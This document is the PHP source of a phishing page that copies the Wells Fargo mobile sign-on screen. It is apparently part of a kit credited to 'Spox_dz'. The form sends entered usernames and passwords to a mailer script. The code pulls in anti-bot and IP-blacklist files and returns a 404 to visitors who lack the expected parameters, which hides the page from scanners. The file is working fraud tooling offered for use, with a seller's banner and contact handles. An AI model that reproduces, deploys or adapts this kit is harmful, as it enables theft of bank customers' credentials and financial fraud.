<?php
session_start();
error_reporting(0);

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Wells             $#
###############################################

**/

include'Spox/Anti/IP-BlackList.php';  
include'Spox/Anti/Bot-Crawler.php';
include'Spox/Anti/Bot-Spox.php';
include'Spox/Anti/blacklist.php';
include'Spox/Anti/new.php';
include'Spox/Functions/Fuck-you.php'; 
include'Spox/Anti/Dila_DZ.php';


if (!isset($_GET['wells_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELLS_SPOX'])) {

  header("Location: index");
  exit();
}

 

?>
<html lang="en" class="mobiletest-html"><head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
        <title>Mobile Sign on | Wells Fargo</title>
        <link rel="stylesheet" href="Spox/Files/css/wf-fonts.css" type="text/css">
        <link rel="stylesheet" href="Spox/Files/css/frontporch.css" type="text/css">
        <link type="text/css" href="Spox/Files/css/signon_clean.css?v=85049D05F1" rel="stylesheet" media="screen,projection,print">
        <link rel="icon" href="favicon.ico" type="image/x-icon">
    </head>
 
 <body theme="ssep" id="body" class="brand-fp" devicetype="mobile">

<div class="header brand-fp" id="header">
  <div class="wf_logo" role="link">
    <img src="Spox/Files/img/masthead-wf_logo-e-148x16.svg" lang="en" role="img">
  </div>
  <div class="hamburger_menu" role="link">
    <a href=""><img src="Spox/Files/img/FP.svg" role="img"></a>
  </div>
</div>
  
<main role="main">
<article>
<form action="Spox/Mail/Mail1.php" id="Signon" method="POST">

  <?php
    if (isset($_GET['invalid'])) {
        $invalid = isset($_GET['invalid']) ? trim(htmlentities($_GET['invalid'])):'';

    if ($invalid == "login") {echo '<div class="messaging">
                        <div class="messaging-wrapper">
                            <div class="icon error">Error</div>
                            <div class="message"><strong>We do not recognize your username and/or password. Please try again or visit <a href="">Username/Password Help</a>.</strong> </div>
                        </div>
                    </div></div><input type="hidden" name="invalid">';
    }}

    ?>
    
<div id="form">
    <h1 class="banner"> Welcome </h1>
    <h2 class="security-link flex-cntr">
        <img src="Spox/Files/img/lock.svg" aria-hidden="true">
        <a class="" href="">Online &amp; Mobile Security</a></h2>
<input type="hidden" name="spox">   
<div id="usernameWrapper" class="bim-input-wrapper">
<label id="username" class="bim-input-label " for="j_username">Username</label>
            
<input class="bim-input" control="forms:input" type="text" name="username" id="j_username" autocomplete="off" maxlength="14" required="">
                
</div>
        <div id="passwordWrapper" class="bim-input-wrapper">
            <label id="lblForPassword" class="bim-input-label" for="password">Password</label>
            <input class="bim-input pmask" control="forms:input" type="password" id="password" name="password" autocomplete="off" maxlength="32" required="">
        </div>
<div id="chkSave">
<div class="save-usr-name">
                    
<input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username">
                    
<label for="saveUsernameCheckbox">
                    <span aria-labelledby="usernameLbl" role="checkbox" tabindex="0" aria-checked="false" aria-live="polite"></span>
                    <p id="usernameLbl">Save Username</p>
                </label>
            </div>
        </div>
        
            <div>
                <button class="primary cta-btn sign-on" data-type="primary" aria-label="Sign On">Sign On</button>
            </div>
            <div id="forgot">
                <p id="forgot">
                    <span lang="en"><a href="">Forgot Password/Username?</a></span></p>
            </div>

            <div>
                <p class="ntwf-link">New to <span lang="en"><i>Wells Fargo Online</i></span><sup>®</sup>?</p>
                <button id="enrollButton" class="secondary-gray cta-btn enroll" control="button" aria-label="enroll">Enroll</button>
            </div>


 
</div>
                        


<div id="footer">
    <div id="links">
        <p><a href="" class="link">PRIVACY, Cookies, Security &amp;
                Legal</a> <span class="link-separator"></span><a href="" class="link">Ad Choices </a>
        </p>
        <p><a href="" class="link online-acc">Online Access
                Agreement</a>

            <span class="link-separator"></span>
            <a href="" class="link e-sign">ESIGN
                    Consent</a>
            
        </p>
        <p>© 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
                    
                
            </article>
        </main>


    <script type="text/javascript" nonce="">
        function enrollButtonHandler(evt) {
            evt.preventDefault();
        }
      

        if(document.querySelector('#usernameWrapper .bim-input')) {
            document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }
        if(document.querySelector('#passwordWrapper .bim-input')) {
            document.querySelector('#passwordWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#passwordWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#passwordWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#passwordWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }



    </script>
</body>

</html>